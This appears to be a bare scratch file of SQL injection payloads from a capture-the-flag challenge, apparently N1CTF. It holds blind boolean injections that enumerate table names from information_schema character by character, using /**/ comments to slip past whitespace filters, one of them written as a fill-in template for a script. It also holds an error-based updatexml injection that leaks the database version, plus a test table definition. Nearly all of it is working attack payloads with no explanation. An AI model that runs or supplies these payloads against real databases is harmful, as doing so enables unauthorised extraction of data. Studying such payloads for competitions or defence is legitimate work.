if(ascii(substr((select/**/table_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/limit/**/1,1),1,1))=56,1,2)
if((select(substr(group_concat(table_name),{},1))from/**/information_schema.tables/**/where/**/table_schema=database())='{}',1,2)
if((select(substr(group_concat(table_name),1,1))from/**/information_schema.tables/**/where/**/table_schema=database())='1',1,2)

insert into time_zone values('1',updatexml(1,concat(0x3a,(select @@version()),0x3a),1));
CREATE TABLE IF NOT EXISTS `n1ctftest1`(
   `ip` VARCHAR(100) NOT NULL,
   `time` VARCHAR(40) NOT NULL,
   PRIMARY KEY ( `ip` )
)ENGINE=InnoDB DEFAULT CHARSET=utf8;